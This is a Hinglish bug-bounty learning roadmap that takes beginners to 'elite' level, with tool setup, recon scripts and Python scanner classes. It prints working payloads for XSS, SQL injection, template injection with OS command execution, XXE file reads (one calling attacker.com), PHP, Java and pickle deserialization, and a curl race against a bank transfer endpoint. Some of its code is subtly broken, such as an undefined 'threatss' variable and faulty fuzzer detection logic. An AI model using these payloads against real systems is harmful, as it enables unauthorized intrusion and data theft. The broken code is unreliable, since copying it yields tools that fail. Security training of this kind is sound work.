# 🔥 Complete Bug Hunting Workflow: Beginner se Elite Level Tak 🔥

## 📋 Table of Contents
1. [Pre-Hunting Setup](#pre-hunting-setup)
2. [Skill Progression Roadmap](#skill-progression-roadmap)
3. [Beginner Level (0-6 months)](#beginner-level)
4. [Intermediate Level (6-18 months)](#intermediate-level)
5. [Advanced Level (18-36 months)](#advanced-level)
6. [Elite Level (3+ years)](#elite-level)
7. [Tools Arsenal](#tools-arsenal)
8. [Advanced Methodologies](#advanced-methodologies)
9. [Pro Tips & Tricks](#pro-tips--tricks)
10. [Common Mistakes to Avoid](#common-mistakes-to-avoid)

---

## 🛠️ Pre-Hunting Setup

### Essential Tools Installation
```bash
# Basic Tools
sudo apt update && sudo apt install -y curl wget git python3 python3-pip golang-go

# Subdomain Enumeration
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/tomnomnom/assetfinder@latest
go install -v github.com/owasp-amass/amass/v3/...@master

# HTTP Tools
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
go install -v github.com/tomnomnom/anew@latest

# Vulnerability Scanners
go install -v github.com/hahwul/dalfox/v2@latest
pip3 install sqlmap

# Directory/File Discovery
go install -v github.com/ffuf/ffuf@latest
sudo apt install gobuster

# Additional Tools
go install -v github.com/tomnomnom/qsreplace@latest
go install -v github.com/sensepost/gowitness@latest
pip3 install wafw00f
```

### Directory Structure Setup
```bash
mkdir -p ~/bugbounty/{recon,tools,wordlists,reports}
cd ~/bugbounty/wordlists
git clone https://github.com/danielmiessler/SecLists.git
```

---

## 🎯 Skill Progression Roadmap

### Learning Path Overview
```
Beginner (0-6M) → Intermediate (6-18M) → Advanced (18-36M) → Elite (3Y+)
     ↓                    ↓                     ↓              ↓
Manual Testing    →  Automation Tools   →  Custom Scripts → Research & 0-Days
Basic Vulns       →  Complex Chains     →  Business Logic → Advanced Attacks
Single Target     →  Multiple Targets   →  Large Scope    → Enterprise Level
```

### Skill Assessment Matrix
| Skill Area | Beginner | Intermediate | Advanced | Elite |
|------------|----------|--------------|----------|-------|
| **Reconnaissance** | Manual subdomain enum | Automated multi-tool | Custom scripts | AI-powered recon |
| **XSS** | Basic payloads | Context-aware | WAF bypass | 0-day research |
| **SQLi** | Union-based | Blind/Time-based | Advanced techniques | Custom exploitation |
| **IDOR** | Sequential testing | Pattern recognition | Business logic | Complex authorization |
| **SSRF** | Basic internal access | Cloud metadata | Protocol smuggling | Advanced chaining |
| **Automation** | Basic scripts | Tool integration | Custom frameworks | ML-powered testing |

### Monthly Milestones
- **Month 1:** First valid bug
- **Month 3:** 5+ valid bugs
- **Month 6:** Advanced vulnerability types
- **Month 12:** Custom tool development
- **Month 18:** Vulnerability chaining
- **Month 24:** Research contributions
- **Month 36+:** Industry recognition

---

## 🌱 Beginner Level (0-6 months)

### Learning Objectives
- **Week 1-2:** Environment setup aur basic tools
- **Week 3-4:** Manual testing techniques
- **Week 5-8:** Automated scanning basics
- **Week 9-12:** First bug discovery
- **Week 13-24:** Consistent bug finding

### Phase 1: Foundation Building

#### Essential Knowledge Areas
1. **HTTP Protocol Deep Dive**
   ```bash
   # HTTP methods understanding
   GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD
   
   # Headers analysis
   curl -I https://target.com
   curl -H "X-Forwarded-For: 127.0.0.1" https://target.com
   ```

2. **Web Application Architecture**
   - Client-Server model
   - Database interactions
   - Authentication mechanisms
   - Session management

#### Hands-on Practice Labs
```bash
# Setup local vulnerable apps
docker run -d -p 3000:3000 vulnerables/web-dvwa
docker run -d -p 8080:8080 webgoat/webgoat-8.0
```

### Phase 2: Basic Reconnaissance (Enhanced)

#### Step 1: Target Information Gathering
```bash
# Whois information
whois target.com

# DNS enumeration
dig target.com ANY
nslookup target.com

# Certificate transparency
curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[].name_value' | sort -u
```

#### Step 2: Subdomain Discovery (Comprehensive)
```bash
# Multiple approaches
subfinder -d target.com -all -silent | tee subs.txt
assetfinder --subs-only target.com | anew subs.txt
findomain -t target.com -q | anew subs.txt

# DNS bruteforcing
gobuster dns -d target.com -w ~/wordlists/subdomains.txt -q | anew subs.txt
```

#### Step 3: Technology Stack Identification
```bash
# Technology detection
whatweb target.com
wafw00f target.com

# CMS detection
python3 cmseek.py -u https://target.com
```

### Phase 3: Vulnerability Discovery (Structured)

#### XSS Testing (Progressive Learning)
```bash
# Level 1: Basic payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# Level 2: Context-aware
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>

# Level 3: Event handlers
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

#### SQL Injection (Systematic Approach)
```bash
# Detection phase
' OR '1'='1
" OR "1"="1
' OR 1=1--

# Exploitation phase
' UNION SELECT 1,2,3--
' UNION SELECT user(),database(),version()--

# Data extraction
' UNION SELECT table_name,null FROM information_schema.tables--
```

### Beginner Practice Routine
```bash
# Daily practice (2-3 hours)
1. Pick 1 target from bug bounty programs
2. Complete reconnaissance (30 min)
3. Manual testing (60 min)
4. Automated scanning (30 min)
5. Documentation (30 min)
```

### Beginner Checklist (Enhanced):
- [ ] HTTP protocol samajh gaya
- [ ] Basic recon kar sakte ho
- [ ] Manual XSS aur SQLi test kar sakte ho
- [ ] Burp Suite proficiently use kar sakte ho
- [ ] First valid bug submit kiya
- [ ] Basic automation scripts likh sakte ho

---

## 🚀 Intermediate Level (6-18 months)

### Learning Objectives
- **Month 6-9:** Advanced vulnerability types
- **Month 9-12:** Automation mastery
- **Month 12-15:** Business logic understanding
- **Month 15-18:** Custom tool development

### Phase 1: Advanced Reconnaissance Techniques

#### Multi-layered Subdomain Discovery
```bash
# Comprehensive enumeration script
#!/bin/bash
domain=$1
echo "[+] Starting comprehensive subdomain enumeration for $domain"

# Passive enumeration
subfinder -d $domain -all -silent | anew subs.txt
assetfinder --subs-only $domain | anew subs.txt
amass enum -passive -d $domain | anew subs.txt
findomain -t $domain -q | anew subs.txt

# Certificate transparency
curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | anew subs.txt

# DNS bruteforcing
puredns bruteforce ~/wordlists/best-dns-wordlist.txt $domain --resolvers ~/resolvers.txt | anew subs.txt

# Permutation scanning
gotator -sub subs.txt -perm ~/wordlists/permutations.txt -depth 1 -numbers 10 -mindup -adv | anew subs.txt

echo "[+] Total subdomains found: $(cat subs.txt | wc -l)"
```

#### Advanced URL Discovery
```bash
# Multi-source URL collection
cat alive.txt | cut -d' ' -f1 > alive_urls.txt

# Wayback machine
cat alive_urls.txt | waybackurls | anew all_urls.txt

# Common crawl
cat alive_urls.txt | gau --blacklist png,jpg,gif,jpeg,swf,woff,svg,pdf | anew all_urls.txt

# Active crawling
cat alive_urls.txt | katana -silent -d 5 -ps -pss waybackarchive,commoncrawl,alienvault | anew all_urls.txt

# Parameter discovery
cat all_urls.txt | grep "=" | anew params.txt
cat all_urls.txt | grep -v "=" | sed 's/$/\//' | anew endpoints.txt
```

### Phase 2: Advanced Vulnerability Testing

#### Context-Aware XSS Testing
```bash
# XSS testing script
#!/bin/bash
url=$1
payloads=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg onload=alert('XSS')>"
    "javascript:alert('XSS')"
    "<iframe src=\"javascript:alert('XSS')\"></iframe>"
    "<body onload=alert('XSS')>"
    "<input onfocus=alert('XSS') autofocus>"
    "<select onfocus=alert('XSS') autofocus>"
    "<textarea onfocus=alert('XSS') autofocus>"
    "<keygen onfocus=alert('XSS') autofocus>"
)

for payload in "${payloads[@]}"; do
    echo "[+] Testing payload: $payload"
    response=$(curl -s "$url" -d "param=$payload")
    if [[ $response == *"$payload"* ]]; then
        echo "[!] Potential XSS found with payload: $payload"
    fi
done
```

#### Advanced SQL Injection Techniques
```bash
# SQLi testing with different techniques
sqlmap -u "https://target.com/page?id=1" --batch --level=5 --risk=3 --random-agent --tamper=space2comment,charencode

# Time-based blind SQLi
' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe

# Boolean-based blind SQLi
' AND (SELECT SUBSTRING(@@version,1,1))='5'--

# Union-based SQLi
' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
```

#### Business Logic Vulnerability Testing
```bash
# Price manipulation testing
# Original: price=100
# Test: price=-100, price=0.01, price=999999999

# Quantity bypass
# Original: quantity=1
# Test: quantity=-1, quantity=0, quantity=999999

# Role escalation
# Change role parameter: role=admin, role=moderator, is_admin=true

# Workflow bypass
# Skip payment: /checkout -> /success
# Skip verification: /register -> /dashboard
```

### Phase 3: Automation & Tool Development

#### Custom Reconnaissance Script
```python
#!/usr/bin/env python3
import subprocess
import requests
import json
import threading
from concurrent.futures import ThreadPoolExecutor

class BugHunter:
    def __init__(self, domain):
        self.domain = domain
        self.subdomains = []
        self.alive_hosts = []
        self.vulnerabilities = []
    
    def subdomain_enum(self):
        """Comprehensive subdomain enumeration"""
        tools = [
            f"subfinder -d {self.domain} -all -silent",
            f"assetfinder --subs-only {self.domain}",
            f"amass enum -passive -d {self.domain}"
        ]
        
        for tool in tools:
            try:
                result = subprocess.run(tool.split(), capture_output=True, text=True)
                self.subdomains.extend(result.stdout.strip().split('\n'))
            except Exception as e:
                print(f"Error running {tool}: {e}")
        
        self.subdomains = list(set(filter(None, self.subdomains)))
        print(f"[+] Found {len(self.subdomains)} subdomains")
    
    def check_alive(self):
        """Check which subdomains are alive"""
        def check_host(subdomain):
            try:
                response = requests.get(f"https://{subdomain}", timeout=5, verify=False)
                if response.status_code == 200:
                    self.alive_hosts.append(subdomain)
                    print(f"[+] Alive: {subdomain}")
            except:
                try:
                    response = requests.get(f"http://{subdomain}", timeout=5)
                    if response.status_code == 200:
                        self.alive_hosts.append(subdomain)
                        print(f"[+] Alive: {subdomain}")
                except:
                    pass
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(check_host, self.subdomains)
    
    def vulnerability_scan(self):
        """Basic vulnerability scanning"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]
        
        for host in self.alive_hosts:
            for payload in xss_payloads:
                try:
                    response = requests.get(f"https://{host}/?q={payload}", timeout=5, verify=False)
                    if payload in response.text:
                        self.vulnerabilities.append(f"XSS found on {host} with payload: {payload}")
                        print(f"[!] XSS found on {host}")
                except:
                    pass
    
    def generate_report(self):
        """Generate vulnerability report"""
        report = {
            "domain": self.domain,
            "subdomains_found": len(self.subdomains),
            "alive_hosts": len(self.alive_hosts),
            "vulnerabilities": self.vulnerabilities
        }
        
        with open(f"{self.domain}_report.json", "w") as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Report saved to {self.domain}_report.json")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 bughunter.py domain.com")
        sys.exit(1)
    
    hunter = BugHunter(sys.argv[1])
    hunter.subdomain_enum()
    hunter.check_alive()
    hunter.vulnerability_scan()
    hunter.generate_report()
```

### Intermediate Checklist (Enhanced):
- [ ] Advanced recon techniques master kiye
- [ ] Business logic vulnerabilities samajh gaye
- [ ] Custom automation scripts bana sakte ho
- [ ] Vulnerability chaining kar sakte ho
- [ ] 20+ valid bugs submit kiye
- [ ] Community mein active participation

---

## 💪 Advanced Level (18-36 months)

### Learning Objectives
- **Month 18-24:** Expert-level vulnerability research
- **Month 24-30:** Advanced attack methodologies
- **Month 30-36:** Industry contributions

### Phase 1: Expert Reconnaissance

#### AI-Powered Reconnaissance
```python
#!/usr/bin/env python3
import openai
import requests
import json

class AIRecon:
    def __init__(self, api_key):
        openai.api_key = api_key
    
    def analyze_target(self, domain):
        """AI-powered target analysis"""
        prompt = f"""
        Analyze the domain {domain} and suggest:
        1. Potential attack vectors
        2. Technology stack vulnerabilities
        3. Business logic flaws to test
        4. Custom wordlists for fuzzing
        """
        
        response = openai.Completion.create(
            engine="text-davinci-003",
            prompt=prompt,
            max_tokens=500
        )
        
        return response.choices[0].text.strip()
    
    def generate_payloads(self, vulnerability_type, context):
        """Generate context-specific payloads"""
        prompt = f"""
        Generate 10 advanced {vulnerability_type} payloads for {context} context.
        Include WAF bypass techniques and encoding variations.
        """
        
        response = openai.Completion.create(
            engine="text-davinci-003",
            prompt=prompt,
            max_tokens=300
        )
        
        return response.choices[0].text.strip().split('\n')
```

#### Advanced OSINT Techniques
```bash
# Social media reconnaissance
python3 sherlock.py target_username

# Email enumeration
python3 theHarvester.py -d target.com -l 500 -b all

# GitHub reconnaissance
python3 github-search.py -s "target.com" -o github_results.txt

# Shodan integration
shodan search "ssl:target.com"
shodan search "hostname:target.com"
```

### Phase 2: Advanced Attack Methodologies

#### Server-Side Template Injection (SSTI)
```bash
# Detection payloads
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${{7*7}}

# Jinja2 exploitation
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Twig exploitation
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

#### Advanced XXE Attacks
```xml
<!-- Basic XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Blind XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]>
<root></root>

<!-- XXE via SVG -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

#### Deserialization Attacks
```bash
# Java deserialization
java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned' | base64

# PHP deserialization
O:8:"stdClass":1:{s:4:"test";s:22:"<?php system($_GET[c]); ?>";}

# Python pickle
import pickle
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(Exploit())
```

### Phase 3: Research & Development

#### 0-Day Discovery Process
```bash
# Source code analysis workflow
1. Target identification
2. Source code acquisition
3. Static analysis (grep, semgrep)
4. Dynamic analysis (fuzzing)
5. Proof of concept development
6. Responsible disclosure
```

#### Custom Fuzzing Framework
```python
#!/usr/bin/env python3
import requests
import threading
import time
from itertools import product

class AdvancedFuzzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = self.load_payloads()
        self.results = []
    
    def load_payloads(self):
        """Load various payload types"""
        return {
            'xss': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
            'sqli': ["' OR '1'='1", '" OR "1"="1'],
            'ssti': ['{{7*7}}', '${7*7}'],
            'xxe': ['<!ENTITY xxe SYSTEM "file:///etc/passwd">'],
            'lfi': ['../../../etc/passwd', '....//....//....//etc/passwd']
        }
    
    def fuzz_parameter(self, param, payload_type):
        """Fuzz specific parameter with payload type"""
        for payload in self.payloads[payload_type]:
            try:
                response = requests.get(
                    self.target_url,
                    params={param: payload},
                    timeout=5
                )
                
                if self.analyze_response(response, payload, payload_type):
                    self.results.append({
                        'param': param,
                        'payload': payload,
                        'type': payload_type,
                        'response': response.text[:500]
                    })
            except Exception as e:
                continue
    
    def analyze_response(self, response, payload, payload_type):
        """Analyze response for vulnerability indicators"""
        indicators = {
            'xss': [payload in response.text],
            'sqli': ['mysql_fetch', 'ORA-', 'PostgreSQL', 'sqlite_'],
            'ssti': ['49' in response.text if payload == '{{7*7}}' else False],
            'xxe': ['root:' in response.text],
            'lfi': ['root:' in response.text, 'bin/bash' in response.text]
        }
        
        return any(indicator in response.text.lower() for indicator in indicators.get(payload_type, []))
```

### Advanced Checklist:
- [ ] 0-day vulnerabilities discover kar sakte ho
- [ ] Advanced attack vectors master ho
- [ ] Custom frameworks develop kar sakte ho
- [ ] Research papers publish kiye
- [ ] Conference presentations diye
- [ ] Industry recognition mila

---

## 🏆 Elite Level (3+ years)

### Learning Objectives
- **Year 3+:** Industry leadership
- **Continuous:** Cutting-edge research
- **Ongoing:** Community contributions

### Phase 1: Research Leadership

#### Novel Attack Vector Development
```python
#!/usr/bin/env python3
"""
Advanced Attack Research Framework
Focuses on discovering new attack vectors and techniques
"""

class AttackResearcher:
    def __init__(self):
        self.attack_vectors = []
        self.research_areas = [
            'browser_exploitation',
            'cloud_security',
            'iot_vulnerabilities',
            'ai_ml_security',
            'blockchain_attacks'
        ]
    
    def research_browser_exploitation(self):
        """Research new browser-based attack vectors"""
        techniques = [
            'service_worker_attacks',
            'shared_array_buffer_exploitation',
            'webassembly_vulnerabilities',
            'css_injection_advanced',
            'timing_attacks_refined'
        ]
        return self.deep_research(techniques)
    
    def research_cloud_security(self):
        """Advanced cloud security research"""
        areas = [
            'container_escape_techniques',
            'serverless_vulnerabilities',
            'cloud_metadata_exploitation',
            'kubernetes_security_flaws',
            'multi_tenant_isolation_bypass'
        ]
        return self.deep_research(areas)
    
    def deep_research(self, areas):
        """Conduct deep research in specific areas"""
        research_results = {}
        for area in areas:
            # Implement advanced research methodologies
            research_results[area] = self.analyze_attack_surface(area)
        return research_results
```

#### AI-Powered Vulnerability Discovery
```python
#!/usr/bin/env python3
import tensorflow as tf
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer

class AIVulnDiscovery:
    def __init__(self):
        self.model = self.build_vulnerability_model()
        self.vectorizer = TfidfVectorizer(max_features=10000)
    
    def build_vulnerability_model(self):
        """Build ML model for vulnerability prediction"""
        model = tf.keras.Sequential([
            tf.keras.layers.Dense(512, activation='relu', input_shape=(10000,)),
            tf.keras.layers.Dropout(0.5),
            tf.keras.layers.Dense(256, activation='relu'),
            tf.keras.layers.Dropout(0.3),
            tf.keras.layers.Dense(128, activation='relu'),
            tf.keras.layers.Dense(10, activation='softmax')  # 10 vulnerability types
        ])
        
        model.compile(
            optimizer='adam',
            loss='categorical_crossentropy',
            metrics=['accuracy']
        )
        
        return model
    
    def predict_vulnerabilities(self, source_code):
        """Predict potential vulnerabilities in source code"""
        # Vectorize source code
        code_vector = self.vectorizer.transform([source_code])
        
        # Predict vulnerability types
        predictions = self.model.predict(code_vector.toarray())
        
        vulnerability_types = [
            'SQL Injection', 'XSS', 'CSRF', 'IDOR', 'SSRF',
            'XXE', 'Deserialization', 'SSTI', 'LFI', 'RCE'
        ]
        
        results = []
        for i, prob in enumerate(predictions[0]):
            if prob > 0.7:  # High confidence threshold
                results.append({
                    'type': vulnerability_types[i],
                    'confidence': float(prob),
                    'recommendation': self.get_recommendation(vulnerability_types[i])
                })
        
        return results
    
    def get_recommendation(self, vuln_type):
        """Get testing recommendations for vulnerability type"""
        recommendations = {
            'SQL Injection': 'Test with sqlmap and manual payloads',
            'XSS': 'Use dalfox and custom context-aware payloads',
            'CSRF': 'Check for anti-CSRF tokens and SameSite cookies',
            # Add more recommendations
        }
        return recommendations.get(vuln_type, 'Manual testing recommended')
```

### Phase 2: Industry Contributions

#### Research Publication Framework
```markdown
# Vulnerability Research Publication Template

## Title
[Descriptive title of the vulnerability/technique]

## Abstract
[Brief summary of the research]

## Introduction
- Problem statement
- Research objectives
- Methodology overview

## Technical Analysis
- Vulnerability details
- Attack vectors
- Exploitation techniques
- Impact assessment

## Proof of Concept
- Code examples
- Step-by-step exploitation
- Screenshots/videos

## Mitigation Strategies
- Prevention techniques
- Detection methods
- Remediation steps

## Conclusion
- Research summary
- Future work
- Industry implications

## References
[Academic and industry references]
```

#### Conference Presentation Framework
```python
#!/usr/bin/env python3
"""
Conference Presentation Preparation Tool
Helps organize research for conference presentations
"""

class ConferencePrep:
    def __init__(self, research_topic):
        self.topic = research_topic
        self.presentation_structure = self.create_structure()
    
    def create_structure(self):
        """Create presentation structure"""
        return {
            'introduction': {
                'duration': '5 minutes',
                'content': ['Problem statement', 'Research motivation', 'Agenda']
            },
            'technical_deep_dive': {
                'duration': '20 minutes',
                'content': ['Vulnerability analysis', 'Attack demonstration', 'Technical details']
            },
            'impact_assessment': {
                'duration': '10 minutes',
                'content': ['Real-world implications', 'Case studies', 'Industry impact']
            },
            'mitigation': {
                'duration': '10 minutes',
                'content': ['Prevention strategies', 'Detection methods', 'Best practices']
            },
            'conclusion': {
                'duration': '5 minutes',
                'content': ['Key takeaways', 'Future research', 'Q&A preparation']
            }
        }
    
    def generate_demo_script(self):
        """Generate live demonstration script"""
        return f"""
        # Live Demo Script for {self.topic}
        
        ## Setup
        1. Environment preparation
        2. Target application setup
        3. Tools configuration
        
        ## Demonstration Steps
        1. Vulnerability discovery
        2. Exploitation process
        3. Impact demonstration
        4. Mitigation implementation
        
        ## Backup Plans
        1. Pre-recorded demo
        2. Screenshots sequence
        3. Alternative examples
        """
```

### Phase 3: Elite Methodologies

#### Advanced Threat Modeling
```python
#!/usr/bin/env python3
"""
Advanced Threat Modeling Framework
For elite-level security assessment
"""

class ThreatModeler:
    def __init__(self, application_type):
        self.app_type = application_type
        self.threat_categories = self.define_threat_categories()
        self.attack_trees = self.build_attack_trees()
    
    def define_threat_categories(self):
        """Define comprehensive threat categories"""
        return {
            'authentication': [
                'credential_stuffing', 'brute_force', 'session_hijacking',
                'jwt_attacks', 'oauth_flaws', 'saml_vulnerabilities'
            ],
            'authorization': [
                'privilege_escalation', 'idor', 'path_traversal',
                'acl_bypass', 'role_confusion', 'context_confusion'
            ],
            'data_validation': [
                'injection_attacks', 'deserialization', 'xxe',
                'ssti', 'mass_assignment', 'type_confusion'
            ],
            'business_logic': [
                'workflow_bypass', 'race_conditions', 'time_manipulation',
                'state_confusion', 'economic_attacks', 'abuse_cases'
            ],
            'cryptography': [
                'weak_algorithms', 'key_management', 'random_number_generation',
                'timing_attacks', 'padding_oracle', 'certificate_validation'
            ]
        }
    
    def build_attack_trees(self):
        """Build comprehensive attack trees"""
        attack_trees = {}
        for category, threats in self.threat_categories.items():
            attack_trees[category] = self.create_attack_tree(threatss)
        return attack_trees
    
    def create_attack_tree(self, threats):
        """Create detailed attack tree for threat category"""
        tree = {}
        for threat in threats:
            tree[threat] = {
                'prerequisites': self.get_prerequisites(threat),
                'attack_vectors': self.get_attack_vectors(threat),
                'detection_methods': self.get_detection_methods(threat),
                'mitigation_strategies': self.get_mitigation_strategies(threat)
            }
        return tree
```

### Elite Checklist:
- [ ] Industry thought leadership established
- [ ] Original research published
- [ ] Conference speaking engagements
- [ ] Open source contributions
- [ ] Mentoring junior researchers
- [ ] CVE discoveries credited
- [ ] Security tool development
- [ ] Academic collaborations
- [ ] Industry recognition

---

## 🛠️ Tools Arsenal

### Reconnaissance Tools
```bash
# Subdomain Enumeration
subfinder, assetfinder, amass, findomain, chaos

# URL Discovery
katana, waybackurls, gau, hakrawler

# Port Scanning
nmap, masscan, rustscan

# Technology Detection
whatweb, wappalyzer, builtwith
```

### Vulnerability Scanners
```bash
# Web Application
burp suite, owasp zap, nikto, w3af

# Specific Vulnerabilities
dalfox (XSS), sqlmap (SQLi), commix (Command Injection)

# Network
nessus, openvas, nuclei
```

### Custom Scripts Location
```bash
~/bugbounty/tools/
├── recon.sh
├── vuln_scan.sh
├── js_analysis.py
├── subdomain_monitor.py
└── report_generator.py
```

### Complete Tools Arsenal (Enhanced)

#### Reconnaissance & OSINT
```bash
# Subdomain Discovery
subfinder -d target.com -all -silent
assetfinder --subs-only target.com
amass enum -passive -d target.com
findomain -t target.com -q
chaos -d target.com -key API_KEY

# DNS Tools
dnsrecon -d target.com -t std
fierce -dns target.com
dnscan -d target.com -w wordlist.txt

# Certificate Transparency
crt.sh, censys.io, shodan.io
certspotter -domain target.com

# Social Media & Email OSINT
sherlock username
theHarvester -d target.com -l 500 -b all
hunter.io, clearbit.com, pipl.com

# GitHub & Code Search
github-search.py -s "target.com"
truffleHog --regex --entropy=False target_repo
gitleaks --repo=target_repo

# Shodan & Internet Scanning
shodan search "ssl:target.com"
censys search "target.com"
zoomeye.org, fofa.so
```

#### Web Application Testing
```bash
# Directory & File Discovery
gobuster dir -u https://target.com -w wordlist.txt
dirsearch -u https://target.com -e php,html,js
ffuf -u https://target.com/FUZZ -w wordlist.txt

# Parameter Discovery
paramspider -d target.com
arjun -u https://target.com/page
x8 -u "https://target.com/page" -w wordlist.txt

# Content Discovery
waybackurls target.com
gau target.com
hakrawler -url https://target.com -depth 3

# Technology Stack Detection
whatweb target.com
wappalyzer target.com
builtwith.com
retire.js (for JS libraries)

# WAF Detection
wafw00f target.com
nmap --script http-waf-detect target.com
```

#### Vulnerability Scanners
```bash
# Web Application Scanners
burp suite professional
owasp zap
acunetix, netsparker
w3af -p scan_profile

# Specific Vulnerability Tools
# XSS
dalfox url https://target.com/page?param=value
xsser -u "https://target.com/page?param=value"
xsstrike -u https://target.com/page

# SQL Injection
sqlmap -u "https://target.com/page?id=1" --batch
jSQL injection tool
NoSQLMap (for NoSQL injection)

# SSRF
ssrfmap -r request.txt
gopherus (for SSRF exploitation)

# XXE
xxeinjector -r request.txt
oxml_xxe (for Office documents)

# Command Injection
commix -u "https://target.com/page?cmd=value"

# LDAP Injection
ldapdomaindump -u username -p password target.com

# Template Injection
tplmap -u "https://target.com/page?template=value"
```

#### Network & Infrastructure
```bash
# Port Scanning
nmap -sS -sV -O -A target.com
masscan -p1-65535 target.com --rate=1000
rustscan -a target.com -- -A

# Service Enumeration
nmap --script vuln target.com
nmap --script discovery target.com
enum4linux target.com (for SMB)

# SSL/TLS Testing
sslscan target.com
sslyze target.com
testssl.sh target.com

# Network Vulnerability Scanners
nessus, openvas, nexpose
nuclei -t nuclei-templates/ -u https://target.com
```

#### Mobile Application Testing
```bash
# Android
jadx app.apk (decompile)
apktool d app.apk (disassemble)
dex2jar app.apk (convert to jar)
mobsf (mobile security framework)

# iOS
class-dump binary
otool -L binary
hopper disassembler
frida (dynamic analysis)

# Static Analysis
semgrep --config=auto source_code/
bandit -r python_code/
brakeman rails_app/
```

#### Cloud Security Testing
```bash
# AWS
aws s3 ls s3://bucket-name --no-sign-request
aws iam get-account-authorization-details
pacu (AWS exploitation framework)
scout suite (multi-cloud auditing)

# Azure
az account list
az vm list
stormspotter (Azure red team tool)

# Google Cloud
gcloud projects list
gcloud compute instances list
gcpbucketbrute bucket_name
```

#### API Testing
```bash
# REST API
postman, insomnia
burp suite (with API testing extensions)
ffuf -u https://api.target.com/FUZZ -w api_wordlist.txt

# GraphQL
graphql-voyager (schema visualization)
graphiql (query interface)
graphql-cop (security scanner)

# API Discovery
kiterunner -A=apiroutes-210228 -t https://target.com
gobuster dir -u https://target.com/api -w api_wordlist.txt
```

### Real-World Scenarios & Case Studies

#### Scenario 1: E-commerce Application Testing
```bash
# Target: Online shopping platform
# Scope: *.shop.com

# Phase 1: Reconnaissance
subfinder -d shop.com -all -silent | tee subs.txt
cat subs.txt | httpx -silent -status-code -title | tee alive.txt

# Phase 2: Technology Detection
whatweb shop.com
# Result: WordPress, WooCommerce, MySQL

# Phase 3: Vulnerability Testing
# Business Logic: Price manipulation
# Original request: {"item_id": 123, "quantity": 1, "price": 100}
# Attack: {"item_id": 123, "quantity": -1, "price": 100}
# Result: Negative quantity gives money back

# IDOR Testing
# Original: /api/orders/12345 (your order)
# Attack: /api/orders/12346 (someone else's order)
# Result: Access to other users' orders

# Payment Bypass
# Normal flow: cart -> checkout -> payment -> success
# Attack: cart -> checkout -> success (skip payment)
# Result: Free items
```

#### Scenario 2: SaaS Platform Testing
```bash
# Target: Project management SaaS
# Scope: *.projectmanager.com

# Phase 1: Subdomain Discovery
amass enum -passive -d projectmanager.com | tee subs.txt
# Found: api.projectmanager.com, admin.projectmanager.com

# Phase 2: API Testing
# JWT Token Analysis
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." | base64 -d
# Found: {"user_id": 123, "role": "user", "exp": 1234567890}

# Privilege Escalation
# Change role from "user" to "admin" in JWT
# Result: Admin access to all projects

# Mass Assignment
# Original: {"name": "Project Name", "description": "Desc"}
# Attack: {"name": "Project Name", "description": "Desc", "owner_id": 1}
# Result: Change project ownership
```

#### Scenario 3: Banking Application Testing
```bash
# Target: Online banking platform
# Scope: *.bank.com (with explicit permission)

# Phase 1: Careful Reconnaissance
# Only passive techniques due to sensitive nature
curl -s "https://crt.sh/?q=bank.com&output=json" | jq -r '.[].name_value'

# Phase 2: Business Logic Testing
# Race Condition in Money Transfer
seq 1 10 | xargs -n1 -P10 -I{} curl -X POST "https://bank.com/transfer" \
  -d "from_account=123&to_account=456&amount=1000" \
  -H "Authorization: Bearer TOKEN"
# Result: Multiple transfers processed simultaneously

# Time-based Attacks
# Transfer $1000 at 23:59:59
# Cancel at 00:00:01 (next day)
# Result: Transfer processed but cancellation in new day fails
```

#### Scenario 4: IoT Device Testing
```bash
# Target: Smart home device
# IP: 192.168.1.100

# Phase 1: Network Discovery
nmap -sS -sV -O 192.168.1.100
# Found: Port 80 (HTTP), 22 (SSH), 23 (Telnet)

# Phase 2: Default Credentials
# Try: admin/admin, admin/password, root/root
telnet 192.168.1.100
# Success with admin/admin

# Phase 3: Firmware Analysis
binwalk firmware.bin
strings firmware.bin | grep -E "(password|key|secret)"
# Found hardcoded WiFi passwords and API keys

# Phase 4: Network Protocol Analysis
wireshark capture on device traffic
# Found: Unencrypted communication with cloud servers
```

### Advanced Testing Methodologies

#### Methodology 1: API Security Testing
```python
#!/usr/bin/env python3
"""
Comprehensive API Security Testing Framework
"""

class APISecurityTester:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.auth_token = auth_token
        self.endpoints = []
